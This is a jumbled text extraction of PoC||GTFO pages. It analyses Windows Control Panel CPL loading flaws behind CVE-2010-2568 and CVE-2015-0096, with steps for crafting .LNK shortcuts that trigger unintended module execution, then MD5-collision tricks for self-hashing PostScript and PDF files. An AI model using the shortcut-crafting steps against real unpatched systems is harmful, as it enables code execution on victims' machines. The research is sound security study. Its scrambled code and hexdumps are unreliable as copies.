that the Test item does launch. When satisfied with
the CPL module in this configuration as a base state,
close any message boxes that remain open, close the
Control Panel, too, and then try a few quick demon-
strations.
By the way—–I say it as if it’s incidental, even
though I can’t stress it enough—two of these demon-
strations begin by varying the circumstances as even
a novice mischief-maker might. Each depends on a
little extra step or rearrangement that you might
stumble onto, especially if your experimental tech-
nique is good, but which is very much easier to add
if its relevance is predicted from theoretical analysis.
If you doubt me, don’t read on right away, but in-
stead take my cue about putting spaces in the path-
25 unzip
Spaces
For our second variation, start undo-
ing the first. Close the Control Panel, remove
the subdirectory, and rename the CPL module to
test.cpl. Then, instead of restoring the registry
data to “path\test.cpl” make it “path\test.cpl
rubbish.” Open the Control Panel. Of course, the
Test item does not show. Close the Control Panel
and make a copy of the CPL module as “test.cpl
rubbish.” Open the Control Panel. See first that
the copy named “test.cpl rubbish” gets loaded
and executed. This, of course, is just what we’d
hope. The quirk starts with the next message box.
It shows that test.cpl gets loaded and executed,
too!
Yes, if the registry data contains a space, the
CPL module as registered executes as expected but
then there’s a surprise execution of something else.
The Control Panel finds a new name by truncating
the registered filename—the whole of it, including
the path—at the first space. And, yes, if the result of
the truncation has no file extension, then .dll gets
pocorgtfo14.pdf CPL/testcpl.zip
41This limit is deliberate. Starting with Windows
XP and its support for Side-By-Side (SxS) assem-
blies, the Control Panel anticipates loading CPL
modules in activation contexts. There are vari-
ous ways that a CPL module can affect the choice
of activation context. For one, the Control Panel
looks for a file that has the same name as the CPL
module, but with “.manifest” appended. Though
this manifest need not exist, the Control Panel has,
since Windows XP SP2, rejected any CPL module
whose pathname is already too long for the mani-
fest’s name to fit the usual MAX_PATH limit. (The
early builds of Windows XP just append without
checking. That they got away with it is a classic
example of a buffer overflow that turns out to be
harmless.)
appended. (Though, no, the extension-free name
doesn’t matter now.)
Please find another Zen-friendly moment for tak-
ing this in. This quirky Wonderland surprise execu-
tion surely counts as a parsing error of some sort. It
means that to fix a case of surprise execution that
Microsoft presented as a parsing error, Microsoft
trusted old code in which a parsing error could cause
surprise execution. So it goes.
Length Finally, play with lengthening the path-
name to something like the usual limit of MAX_PATH
characters. That’s 260, but remember that it in-
cludes a terminating null. Close the Control Panel.
Make a copy of test.cpl with some long name and
edit the registry data to match the copy that has
this long name. Open the Control Panel. Repeat
until bored. Perhaps start with the 259 characters
of
1 c : \ temp\ c p l t e s t \1123456789 a b c d e f 2 1 2 3 4 5 6 7 8 9
abcdef3123456789abcdef4123456789abcdef . . . f
3 123456789 abcde . c p l
and work your way down—–or start with
1 c : \ temp\ c p l t e s t \ t e s t . c p l 9 a b c d e f 2 1 2 3 4 5 6 7 8 9
abcdef3123456789abcdef4123456789abcdef . . . f
3 123456789 a b c d e f 0 1 2
if you want to stay with the curious configura-
tion where one CPL module is registered but two get
executed. (My naming convention is that after the
16 characters of my chosen path, the filename part
has each character show its 0-based index into the
pathname, modulo 16, except that where the index
is a multiple of 16 the character shows how many
multiples. The ellipses each hide 160 characters.)
Either way, for any version of Windows from the last
decade, the Test item does not show, and the CPL
module does not get loaded and executed—until you
bring the pathname down to 250 characters, not in-
cluding the terminating null.
Key:
Value:
Type:
Data:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs
anything, e.g., Test
REG_SZ or REG_EXPAND_SZ
path\test.cpl
Figure 9. CPL Module Registry Entry
42The Exec Name
by the version numbers) had seen Microsoft intro-
duce the mostly welcome StringCb and StringCch
families of helper routines for programmers to work
with strings more securely, this particular copying
of a string was not converted to these functions un-
til Windows Vista—and even then the programmer
could blow away much of its point by not checking
it for failure.
If the CPL module’s pathname is just long
enough, the saved exec name gets truncated so that
it keeps the comma but loses at least some of the
icon index. When the GetIconLocation method
parses the (truncated) exec name, it sees the comma
and infers that an icon index is present. If enough
of the icon index is retained such that digits are
present, including after a negative sign, then the
only consequence is that the inferred icon index is
numerically wrong. If the CPL module’s pathname
is exactly the “right” length, meaning 257 or 258
characters (not including a terminating null), then
the icon index looks to be empty or to be just a
negative sign, and is interpreted as zero. 27
It’s time for another of those Wonderland mo-
ments. To defeat a spoof that Microsoft misrep-
resented as a parsing error, Microsoft dealt with a
suspect zero by proceeding as if the zero had been
-1, but then an actual parsing error in the deeper
implementation could turn the -1 back to zero!
The practical trouble with this parsing error,
which is perhaps the reason it wasn’t noticed at the
time, is that it kicks in only if the CPL module’s
pathname is longer than the 250-character maxi-
mum that we demonstrated earlier. An item ID that
could trigger this parsing error isn’t ever going to be
created by the Control Panel. It can’t, for instance,
get fed to GetUIObjectOf from a shortcut file that
we created simply by a Ctrl-Shift drag. If we want
to demonstrate this parsing error without resorting
to a Windows version that’s so old that the Control
Panel doesn’t have the 250-character limit, the item
ID would need to be faked. We need a specially
crafted shortcut file after all.
As we move toward the specifics of loading and call-
ing a CPL module to ask which icon to show, it’s as
well to observe that this lower-level code for load-
ing and calling CPL modules in general is not just
quirky in some of its behaviors, but also in how it
gets its inputs. Reasons for that go back to an-
cient times and persist, so that CPL modules can
be loaded and executed via the RUNDLL32.EXE pro-
gram, the lower-level code for loading and calling
CPL modules that receives its specification of a Con-
trol Panel item as text–—as if it were supplied on a
command line. For this purpose, the text appears
to be known in Microsoft’s source code as the item’s
exec name. It is composed as the module’s path-
name between double-quotes, then a comma, and
then the item’s display name.
Perhaps this comes from wanting to reuse as
much legacy code as possible. The loading and ex-
ecuting of a CPL module specifically to ask which
icon to show for one of that module’s Control Panel
items—even though this task is no longer ever done
on its own from any command line—is handled as a
special case with a slightly modified exec name: the
module’s pathname, a comma, a (signed) decimal
representation of the icon index, another comma,
and the item’s display name. 26
The absence of double-quotes around the mod-
ule’s pathname in this modified exec name is much
of the reason for the quirky behaviour demonstrated
above when the pathname contains a space. It goes
further than that, however.
I ask you again to take another Wonderland Zen
moment of reflection. The GetUIObjectOf method
receives the module’s pathname, the item’s icon
index, and the item’s display name—among other
things—in a binary package. It parses them out of
the package and then into this modified exec name,
i.e., as text, which the deeper implementation will
have to parse. What could go wrong with that?
The immediate answer is that the modified exec
name is composed in a buffer that allows for 0x022A
characters, but, until Microsoft’s second fix, only
MAX_PATH characters are allowed for the copy that’s
kept for the object that gets created to represent
the Control Panel item for the purpose of provid-
ing an IExtractIcon interface. This mismatch of
allowances is ancient. Worse, even though Windows
Server 2003 (chronologically, but Windows XP SP2,
26 At
Shortcut Crafting Making an uncrafted short-
cut file is straightforward if you’re already familiar
with programming the Windows shell. The shell
provides a creatable COM object for the job, with
interfaces whose methods allow for specifying what
the shortcut will be a shortcut to, and for saving
this point, you might feel exactly how Alice felt in Wonderland. The Cheshire Cat would approve. —PML
now we don’t even need to ask what the Caterpillar was smoking. —PML
27 And
43the shortcut as a .LNK file. The target, being an
arbitrary item in the shell namespace, is specified
as a sequence of shell item identifiers that generalise
the pathname of a file-system object. To represent
a Control Panel item, we just need to start with
a shell item identifier for the Control Panel itself,
and append the item ID such as we’ve been talk-
ing about all along. Where crafting comes into it is
that we’ve donned hacker hats, so that the item ID
we append for the Control Panel item is confected.
But enough about the mechanism! You can read the
source code. 28
To build, use the Windows Driver Kit (WDK)
for Windows 7. The 32-bit binary suffices for 64-
bit Windows. You may as well build for the oldest
supported version, which is Windows XP, but the
program does nothing that shouldn’t work even for
Windows 95.
To test, open a Command Prompt in some
directory, e.g., path, where you have a copy of
test.cpl from the earlier demonstrations of gen-
eral behaviour. Again, for simplicity and definite-
ness, start with a path that contains no spaces and
is not ridiculously long. To craft a shortcut to what
might be a Control Panel item named Test that’s
hosted by this test.cpl, run the command
gram confect the item ID, feed it to GetUIObjectOf
by calling directly, and then call GetIconLocation
and report the result.
Either way, the details that we want to spec-
ify are the module’s pathname and the icon index.
We’ll provide pathnames that are longer than the
Control Panel accepts when enumerating Control
Panel items, but which nonetheless result in the ex-
pected loading and execution when the icon index is
zero. Then, we’ll demonstrate that when the path-
name is just the right length, as predicted above,
the loading and execution happen even when the
icon index is non-zero. The assumption throughout
is that the Windows you try this on does not have
Microsoft’s second fix.
We know anyway not to bother with the very
longest possible name (except as a control case),
since the truncation loses the comma from the exec
name such that it will seem to have no icon index
at all. Instead make a copy of test.cpl that has a
258-character name such as
1 c : \ temp\ c p l t e s t \1123456789 a b c d e f 2 1 2 3 4 5 6 7 8 9
abcdef3123456789abcdef4123456789abcdef . . . f
3 123456789 abcd . c p l
1 l i n k c p l / module : path \ t e s t . c p l / i c o n : 0 /name :
Test t e s t . l n k
With the Windows Explorer, browse to this same
directory. If running on an earlier version than Win-
dows 7 SP1 without Microsoft’s first fix, you should
see the CPL module’s message box even without
having registered test.cpl for execution. For any
later Windows version or if the first fix is applied,
browsing the folder executes the CPL module only
if it’s been registered.
For full confidence in this base state, re-craft the
shortcut but specify any number other than zero
for the icon index. Confirm that browsing does not
cause any loading and executing unless the short-
cut records that the CPL module is of the sort that
always wants to be asked which icon to show.
Craft a /icon:0 shortcut that has this same long
name for the module’s pathname. If testing on a
Windows that has the first fix, also edit this long
name into the registry. Browse the directory that
contains the shortcut—and perhaps be a little dis-
appointed that the CPL module does not get loaded
and executed.
But now remember that delicious quirk in which
a space in the module’s pathname, within the 250-
character limit, induces the loading and executing of
two CPL modules, first as given and then as trun-
cated at the first space. Copy test.cpl as
1 c : \ temp\ c p l t e s t \ t e s t . c p l 9 a b c d e f 2 1 2 3 4 5 6 7 8 9
abcdef3123456789abcdef4123456789abcdef . . . f
3 123456789 a b c d e f 0 1
Re-craft the shortcut by giving this name to the
/module switch in quotes. Update the registration
if appropriate. Still, the copy with the long name
doesn’t get loaded and executed—–but, as you might
have suspected, the copy we’ve left as test.cpl
does! Indeed, because the copy with the long name
Very Long Names
The point to crafting the
shortcut is that we can easily use it to deliver to
GetUIObjectOf an item ID that we specify in detail.
Do note, however, that the shortcut is only conve-
nient, not necessary. We could instead have a pro-
28 unzip
pocorgtfo14.pdf CPL/linkcplsrc.zip CPL/linkscplbin.zip
44doesn’t have to execute for this purpose, and be-
cause its Control Panel item won’t show in the Con-
trol Panel, it doesn’t need to be a copy. Even an
empty file suffices!
a quirk even deeper into the code such that the CPL
module executes needed not to be the one specified.
CVE-2015-0096 appeared to be the first public
recognition of this, not that you would ever guess it
from the formal description or from anything that I
have yet found that Microsoft has published about
it. From Dave Weinstein’s explanation, it appears
that the incompleteness of the first fix was found by
following the mind of an attacker frustrated by the
first fix and seeking a way around it.
The second fix plausibly does end the exploitabil-
ity, at least for the purpose of using shortcuts to
Control Panel items as a way to spread a worm.
The edge cases exist only because of a parsing error
caused by a buffer overflow. The second fix increases
the size of the destination buffer so that it does not
overflow when receiving its copy of the exec name.
For good measure, it also tracks the icon index sep-
arately, so that it anyway does not get parsed from
that copy.
But the CPL module’s filename continues to be
parsed from that copy. If it contains a space, then
the Control Panel still can execute two CPL mod-
ules, one as given and one whose name is obtained
by truncating at the first space. Only because of this
were the edge cases ever exploitable. Yet even as late
as the original release of Windows 10—which is as
far as I have yet caught up to for my studies—it re-
mains true that if you can register “path\test.cpl
rubbish” or “path\space test.cpl” for execution
as a CPL module, then you can get path\test.cpl
or path\space.dll loaded and executed by sur-
prise. Is anyone actually happy about that?
Many ways seem to lead into this Wonderland,
but is there a way out?
Edge Cases By repeating with ever shorter path-
names, but also trying non-zero values for the icon
index, we can now demonstrate that CVE-2010-2568
has its own edge cases, as predicted from theoretical
analysis. The general case has zero for the icon in-
dex. The edge cases are that if the pathname is very
long but contains a space in the first 250 characters,
then the icon index need not be zero. The following
table summarises the behaviour on a Windows that
does not have CVE-2010-2568 fixed.
The length does not include a terminating null.
The icon index is assumed to be syntactically valid:
negative means 0xFF000000 to 0xFFFFFFFF in-
clusive; positive means 0x00000001 to 0x00FFFFFF
inclusive. Execution is of the CPL module that is
named by truncating the very long pathname at its
first space. (Also, if this has no file extension, ap-
pending .dll as a default.)
Length
259
258
257
Less
Icon Index
Any
Zero
Non-Zero
Zero
Negative
Positive
Zero
Non-Zero
Exec?
No
Yes
Yes
Yes
Yes
No
Yes
No
Remarks
Edge Case
Edge Case
If Registered 29
CVE-2015-0096
The point to Microsoft’s first fix of CVE-2010-2568
was to avoid execution unless the pathname in the
item ID was that of a registered CPL module. But
the decision to test the registration only if the icon
index in the item ID was zero meant that the two
edge cases were completely unaffected. Worse, when
the icon index in the item ID was zero, changing the
zero to −1 would turn the suspect item ID not into
something harmless but into an edge case. Either
way, the pathnames had to be so long that the edge
cases turned into surprise execution only because of
29 Since
the first fix, this executes only if registered.
4514:09
Postscript that shows its own MD5
by Gregor “Greg” Kopf
Introduction
Playing with file formats to produce unexpected re-
sults has been a hacker past-time for quite a while.
These odd results often include self-referencing code
or data structures, such as zip bombs, self-hosting
compilers, or programs that print their own source
code–called quines. Quines are often posed as brain
teasers for people learning new programming lan-
guages.
In the light of recent attacks on the crypto-
graphic hash functions MD5 and SHA-1, it is natural
to ask a related question: Is there a program that
prints out its own MD5 or SHA-1 hash? A similar
question has been posed on Twitter by Melissa. 30
Melissa
complete, could build a program that prints out its
own MD5 or SHA-1 hash?
The problem of building such a program can be
viewed from (at least) two different angles. One
could view this hypothetical program as a modified
quine: instead of printing its own source code, the
program prints the hash of its own source code. If
you are familiar with how quines can be generated,
you can easily see that the following program is in-
deed a solution to the question:
1 a =[ ’ from h a s h l i b i mpo rt ∗ ’ , ’ n=c h r ( 1 0 ) ’ ,
’ p r i n t md5( " a="+s t r ( a )
3
+n+n . j o i n ( a )+n ) . h e x d i g e s t ( ) ’ ]
from h a s h l i b import ∗
5 n=chr ( 1 0 )
print md5( " a="+s t r ( a )+n+n . j o i n ( a )+n ) .
hexdigest ()
@0xabad1dea
Trick I want to see: a document in a
conventional format (such as PDF) which
mentions its own MD5 or SHA1 hash in the text
and is right
While this method can likely be applied to
Postscript documents as well, I did not like it very
much. Computing the MD5 hash of the program at
runtime felt like cheating.
8:55 AM 9 Aug 2013
The desired file is a modified fixpoint of the used
hash function, in the same sense that this program
is a modified quine. A plain fixpoint would be a
value x where x = h(x). Here, h denotes the hash
function. This problem has not yet, so far as I know,
been solved constructively. (Statistics reveals that
such fixpoints exist with a certain probability, how-
ever.)
The original tweet is from 2013. It appears that
since then nobody provided a convincing solution
because in March 2017 Ange Albertini declared that
the challenge was still open. This brought the prob-
lem to my attention—the perfect little Sunday morn-
ing challenge.
A Bit of Context
Melissa’s challenge asks whether there is a document
in a conventional format that prints its own MD5
or SHA-1 hash. At the first glance this question
might appear to be a bit stronger than the question
for a program that prints its own MD5 or SHA-1
hash. However, it is well known that several doc-
ument formats actually allow for Turing-complete
computations. Proving the Turing-completeness of
exotic programming languages (such as Postscript
files or the x86 mov instruction) is in fact another
area that appears to attract the attention of sev-
eral hackers. Considering that Postscript is Turing-
30 https://twitter.com/0xabad1dea/status/365863999520251906
46But there is another—even simpler—trick one can
perform given the ability to create colliding MD5 in-
puts. One can create two executables with the same
MD5 hash but with different semantics. The general
idea is to generate two colliding MD5 inputs a and
b. We can then write a program like the following.
print ’ Hi , my message i s : ’
2 i f a == b :
print " H e l l o World"
4 else :
print "Oh noez , I ’ ve been hacked ! ! 1 "
And another program like this:
1 print ’ Hi , my message i s : ’
i f b == b :
3
print " H e l l o World"
else :
5
print "Oh noez , I ’ ve been hacked ! ! 1 "
Both programs will have the same MD5 hash; in
the second program, we only replaced a with b.
But why does this work? There are two things
one needs to pay attention to. Firstly, we have to
understand that while the inputs a and b might col-
lide under MD5, the strings "foo"+a and "foo"+b
may not necessarily collide. Fortunately, Wang’s at-
tack allows us to rectify this. The attack does not
only generate colliding MD5 inputs, it also allows to
generate collisions that start with an arbitrary com-
mon prefix. (This is what the term chosen-prefix
is about.) This is precisely what is required, and
we can now generate MD5 inputs that collide under
MD5 and share the following prefix.
Fortunately, we are looking for something a lit-
tle easier. We are looking for an x that satis-
fies x = encode(h(x)) for some encoding function
encode(). I decided to chase this idea: constructing
such a value x, using MD5 as hash function h() and
a function that builds a Postscript file as encode().
1 print ’ Hi , my message i s : ’
if
Secondly, we also need to keep in mind that in
our programs we have appended some content af-
ter the colliding data. Fortunately, as MD5 is a
Merkle–Damgård hash, given two colliding inputs a
and b, the hashes MD5(a + x) and MD5(b + x) will
also collide for all strings x. This property allows
us to append arbitrary content after the colliding
blocks.
The Basics
When Wang et al., broke MD5 in 2005, there was
considerable interest in what one could do with a
chosen-prefix MD5 collision attack. Sotirov et al.,
have demonstrated in 2008 that one could exploit
Wang’s work in order to build a rogue X.509 CA
certificate—the final nail in MD5’s coffin.
47Constructing the Target
We can replace a with b, and we can replace c
with d. In total, this yields four different programs
with the same MD5 hash. If we add a statement like
print result at the end of each program, we have
four programs that output four different bit-strings
but share a common MD5 hash!
How does this enable us to generate a program
that outputs its own MD5 hash? We first generate a
program that we can encode 128 bits into. Knowing
that the MD5 hash of this program will not change
independently from what bits we encode into the
program. Therefore, we simply encode the 128 out-
put bits of MD5 into the program without altering
its hash value. In other words, the program prints
the 128 output bits of its own hash value.
Using the above technique allows us to encode a sin-
gle bit of information into a program without chang-
ing the program’s MD5 hash. Can we also encode
more than one bit into such a program? Unsurpris-
ingly, we can!
We start the same way that we have already seen,
by generating two MD5 collisions a and b that share
the following prefix.
print ’ Hey , I can e nc od e m u l t i p l e b i t s ! ’
2 result = [ ]
if
This allows us to build two colliding programs
that look like the following. (Exchange a with b to
get the second program.)
1 print ’ Hey , I can e nc od e m u l t i p l e b i t s ! ’
result = [ ]
3 i f a == b :
r e s u l t . append ( 0 )
5 else :
r e s u l t . append ( 1 )
And from here, we simply iterate the process,
computing two colliding MD5 inputs c and d that
share this prefix.
Application to Postscript
This technique can directly be applied to Postscript
documents as Postscript is a simple, stack-based lan-
guage. Please consider the following code snippet.
1 (a)
(b)
3 eq
{
5 1
}{
7 0
} ifelse
print ’ Hey , I can e nc od e m u l t i p l e b i t s ! ’
2 result = [ ]
i f a == b :
4
r e s u l t . append ( 0 )
else :
6
r e s u l t . append ( 1 )
8 if
This allows us to build a program with two bits
that might be adjusted without changing the hash.
print ’ Hey , I can e nc od e m u l t i p l e b i t s ! ’
2 result = [ ]
i f a == b :
4
r e s u l t . append ( 0 )
else :
6
r e s u l t . append ( 1 )
8 i f c == d :
r e s u l t . append ( 0 )
10 e l s e :
r e s u l t . append ( 1 )
48While this may look a bit cryptic, the program
is in fact very simple. It compares the string literal
“a” to the string literal “b”, and if both strings are
equal, it pushes the numeric value 1 to the stack.
Otherwise, it pushes a 0.
This examples highlights the manner in which we
can build a Postscript file that we encode 128 bits
of information into without changing the file’s MD5
hash. The program will push these desired bits to
the stack. We can extend this program with a rou-
tine that pops 128 bits off the stack and encodes
them in hex. To demonstrate the feasibility of this
idea, we can inspect how one nibble of data would
be handled by this routine.
This code excerpt will pop four bits off the stack.
If all bits are zero, the string literal “0” will be
pushed onto the stack. If the lowest bit is a one and
all other bits are zero, the string literal “1” will be
pushed, etc. The show statement at the end causes
the nibble to be popped off the stack and written to
the current page.
An example of such a Postscript document is
included in the feelies. 31 If you want to build
such a document on your own, you could use the
python-md5-collision library 32 to build MD5 col-
lisions with chosen prefixes.
$ md5sum poc.ps
768d9d89d2bc825a319eb8962ad30580
0 eq
2 {
0 eq
4
{
0 eq
6
{
0 eq
8
{
(0)
10
}{
(1)
12
} ifelse
}{
14
0 eq
{
16
(2)
}{
18
(3)
} ifelse
20
} ifelse
}{
22 . . .
show
Closing Remarks
We have seen two approaches for generating pro-
grams that print out their own hash values. The
quine approach does not require a collision in the
used hash function, however this comes at the cost
of language complexity. In order to build such a
modified quine, the chosen language must allow for
self-referencing code as well as computing the se-
lected hash function.
The fixpoint approach is computationally more
expensive to implement, as several hash collisions
must be computed. However, these hash calcula-
tions can be performed in any programming envi-
ronment. With this approach, the target language
can be comparably simple: it just needs condition-
als, string comparison and some method to output
the result.
31 unzip
32 git
poc.ps
pocorgtfo14.pdf md5.ps
clone https://github.com/thereal1024/python-md5-collision
4914:10
A PDF That Shows Its Own MD5
by Mako
Even though MD5 is quite broken, you might
easily assume that creating a file that contains its
own MD5 is impossible. After all, surely changing
the file would change its MD5? Let’s honor this
publication’s fine history of PDF tricks by creating
a PDF file that displays its own MD5 hash when
viewed.
0
1
2
3
4
5
2
This adds some restrictions. Everything other
than the pairs of collision blocks must now be the
same. Furthermore, the two versions of the first col-
lision block have a fixed relationship, as shown in
Figure 10.
If we could only get one of those bits to be in the
length field of a JPEG comment marker, we could
take loving inspiration from Ange Albertini’s trick in
the SHAttered attack, colorfully explained by Hec-
tor Martin 34 in Figure 11, to display two different
images.
Unfortunately, they’re in the middle of the colli-
sion block, and worse, those message words are being
used to satisfy these constraints on Q[5], Q[12] and
Q[15]: 35
Each of these nibble elements (pictures, text)
is crafted to collide with the others:
swapping them preserve the hash.
3
All displayed nibbles of the hash can be changed
to match the file's hash while keeping the same hash.
1
Each hash nibble is a reference to a distinct element:
their value is stored in specific areas of the file
where the collisions can be crafted.
Our tactic will be to make each digit of the MD5
checksum a separate JPEG image, and make the
MD5 hashes of all 16 possible images collide to the
same value. We can then swap out images to display
any combination of digits without affecting the file’s
MD5. This requires 15 collisions per digit, and since
they depend on the MD5 of the preceding part of the
document, we need to do this for each digit, for a to-
tal of 15 × 32 = 480 collisions. With a few compute-
months of power we could just append chosen-prefix
collisions to whatever images we liked and be done
with it, but that’s too slow. If we could make do
with faster shared-prefix MD5 collisions — for exam-
ple Marc Stevens’ Fastcoll 33 — we could be finished
in an hour.
1
Craft file structure:
each hash nibble is a reference to a specific element
where the collisions will happen.
Q[5] = 01000ˆ01 11111111 11111111 11ˆˆ10ˆˆ
Q[12] = 0!0....0 ..!..01. ..1...1. 1.......
Q[15] = 1.0....0 .......! 1....... ....0...
. is don’t-care,
ˆ is same as previous Q,
! is inverted from previous Q.
Hmmm.
Q[15] is pretty lightly con-
strained.
Maybe we could just set m[14] =
(m[14]&0xff000000)|0x01feff and see what it does
to Q[15]. That’d give a JPEG comment of length
256-383 bytes on one side and 128 bytes longer on
the other, and we can try just generating new sets of
values until they meet the constraints. Luckily this
works often enough to be practical, though there
are probably more elegant approaches.
Now we can start colliding JPEGs! The struc-
ture is quite simple: we begin with an FF D8 start-
of-image marker and the parts that are identical in
all our images, such as the JFIF APP0 segment,
then add a JPEG comment that will end at exactly
byte 56 of our collision block. After padding to a
64-byte block boundary and creating a collision, we
finally have two partial files with identical MD5 val-
ues but different JPEG comment lengths.
From here it’s straight sailing. In the short-
comment version, the next JPEG marker parsed is a
Header
displayed elements
Body
2
Compute collisions for all 16 values for the 1st nibble
(abusing file formats, based on the current file prefix).
012
3
Do the same for the 2nd nibble...
(the prefix contains the first nibble area now)
X+1
X
1st nibble
references
2nd nibble
...and so on, for each nibble of the hash
(32 in the case of MD5).
Change all nibbles to match the actual file hash.
...
Footer
33 unzip
pocorgtfo14.pdf fastcoll-v1.0.0.5-1.zip
https://twitter.com/marcan42/status/835175023425966080
35 If these constraints look like voodoo or hoodoo to you, please unzip pocorgtfo14.pdf md5-1block-collision.pdf
stevensthesis.pdf and read Marc Stevens’ papers on how the collisions are formed. Don’t expect to learn all of his magic in
just a weekend. —PML
34 See
50block b [4] = block a [4] + (1 << 31);
block b [11] = block a [11] + (1 << 15);
block b [14] = block a [14] + (1 << 31);
(rest of block is unchanged)
Figure 10. Colliding Block Relationship
PDF Header
Desync
$ hexdump
|%PDF-1.3.%......| 00000000
|.1 0 obj.<</Widt| 00000010
|h 2 0 R/Height 3| 00000020
| 0 R/Type 4 0 R/| 00000030
|Subtype 5 0 R/Fi| 00000040
|lter 6 0 R/Color| 00000050
|Space 7 0 R/Leng| 00000060
|th 8 0 R/BitsPer| 00000070
|Component 8>>.st| 00000080
|ream......$SHA-1| 00000090
| is dead!!!!!./.| 000000a0
|.#9u.9...<L.....| 000000b0
|sF..f.~.....!.V.| 000000c0
|..g....[.Ly..+=.| 000000d0
|..m......E.O&...| 000000e0
|.8.j./..r..E..F.| 000000f0
|<W......U....+.1| 00000100
|...7.....3....5.| 00000110
|.M.....dy.x,v!V`| 00000120
|.0...k..?....F).| 00000130
|................| 00000140
|................| 00000150
|................| 00000160
|................| 00000170
|................| 00000180
|................| 00000190
|................|
This is the only part 000001a0
of the
|................|
000001b0
files which is different
|................| 000001c0
|................| 000001d0
|................| 000001e0
|................| 000001f0
|................| 00000200
|................| 00000210
|................| 00000220
|................| 00000230
|..JFIF.....H.H..| 00000240
|...C............| 00000250
|................| 00000260
|................| 00000270
|................| 00000280
|........C.......| 00000290
|................| 000002a0
|................| 000002b0
|................| 000002c0
|................| 000002d0
Small comment on the
|................|
000002e0
right hides the header
|................|
000002f0
between the two large
|................|
00000300
|................|
00000310
comments on the left
|................| 00000320
|..'.............| 00000330
|................| 00000340
-vC shattered-1.pdf
25 50 44 46 2d 31 2e 33 0a 25 e2 e3 cf d3 0a 0a
0a 31 20 30 20 6f 62 6a 0a 3c 3c 2f 57 69 64 74
68 20 32 20 30 20 52 2f 48 65 69 67 68 74 20 33
20 30 20 52 2f 54 79 70 65 20 34 20 30 20 52 2f
53 75 62 74 79 70 65 20 35 20 30 20 52 2f 46 69
6c 74 65 72 20 36 20 30 20 52 2f 43 6f 6c 6f 72
53 JPEG
70 61 Start
63 65 20 37 20 30 20 52 2f 4c 65 6e 67
74 68 20 38 20 30 20 52 2f 42 69 JPEG
74 73 50 65 72
43 6f 6d 70 6f 6e 65 6e 74 20 38 3e 3e Comment
0a 73 74
72 65 61 6d 0a ff d8 ff fe 00 24 53 48 41 2d 31
20 69 73 20 64 65 61 64 21 21 21 21 21 85 2f ec
09 23 39 75 9c 39 b1 a1 c6 3c 4c 97 e1 ff fe 01
73 46 dc 91 66 b6 7e 11 8f 02 9a b6 21 b2 56 0f
f9 ca 67 cc a8 c7 f8 5b a8 4c 79 03 0c 2b 3d e2
18 f8 6d b3 a9 09 01 d5 df 45 c1 4f 26 fe df b3
dc 38 e9 6a c2
2f e7 bd
72 =
8f 0e 45 bc e0 46 d2
Comment
length
3c 57 0f eb 14
13 98 bb
55 2e 0x173
f5 a0 a8 2b e3 31
fe a4 80 37 b8 b5 d7 1f 0e 33 2e df 93 ac 35 00
eb 4d dc 0d ec c1 a8 64 79 0c 78 2c 76 21 56 60
dd 30 97 91 d0 6b d0 af 3f 98 cd a4 bc 46 29 b1
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 JPEG
00 00 Comment
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00
00 00
00 00 gets
00
JPEG
parsing
00 00 00 00 00 00 00 00 00 00 00
00 00
00 00 00
00 00 00 00 00 00 00 00 00 00 00 out
00 of
00 sync
00 here
00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 ff fe 00 fc 00 00 00 00 00 00 00 00 ff e0
00 10 4a 46 49 46 00 01 01 01 00 48 00 48 00 00
ff db 00 43 00 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 ff db 00 43 01 01 01 01 01 01 01
01 01 01 01 01 01 JPEG
01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 Comment
01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01
01 01 01 01 01 01 01 01 01 01 ff c2 00 11 08 02
e4 04 00 Real
03 01 11 00 data
02 11 01 much
03 11
01 ff c4 00
later...
1e 00 01 00 02 JPEG
03 00 03 starts
01 01 00 00
00 00 00 00
00 00 00 07 08 05 06 09 03 04 0a 02 01 ff c4 00
1d 01 01 00 01 05 JPEG
01 01 Comment
01 00 00 00 00 00 00 00
00 00 00 07 03 04 05 06 08 02 09 01 ff fe 00 06
ff fe 27 f4 ff da 00 0c 03 01 00 02 10 03 10 00
00 01 a1 fa ff 00 d8 c0 00 00 00 00 00 00 00 00
Collision blocks
Variable
$ hexdump
00000000
00000010
00000020
00000030
00000040
00000050
00000060
00000070
00000080
00000090
000000a0
000000b0
000000c0
000000d0
000000e0
000000f0
00000100
00000110
00000120
00000130
00000140
00000150
00000160
00000170
00000180
00000190
000001a0
000001b0
000001c0
000001d0
000001e0
000001f0
00000200
00000210
00000220
00000230
00000240
00000250
00000260
00000270
00000280
00000290
000002a0
000002b0
000002c0
000002d0
000002e0
000002f0
00000300
00000310
00000320
00000330
00000340
Interleaving
-vC shattered-2.pdf
25 50 44 46 2d 31 2e 33 0a 25 e2 e3 cf d3 0a 0a |%PDF-1.3.%......|
0a 31 20 30 20 6f 62 6a 0a 3c 3c 2f 57 69 64 74 |.1 0 obj.<</Widt|
68 20 32 20 30 20 52 2f 48 65 69 67 68 74 20 33 |h 2 0 R/Height 3|
20 30 20 52 2f 54 79 70 65 20 34 20 30 20 52 2f | 0 R/Type 4 0 R/|
53 75 62 74 79 70 65 20 35 20 30 20 52 2f 46 69 |Subtype 5 0 R/Fi|
6c 74 65 72 20 36 20 30 20 52 2f 43 6f 6c 6f 72 |lter 6 0 R/Color|
53 JPEG
70 61 Start
63 65 20 37 20 30 20 52 2f 4c 65 6e 67 |Space 7 0 R/Leng|
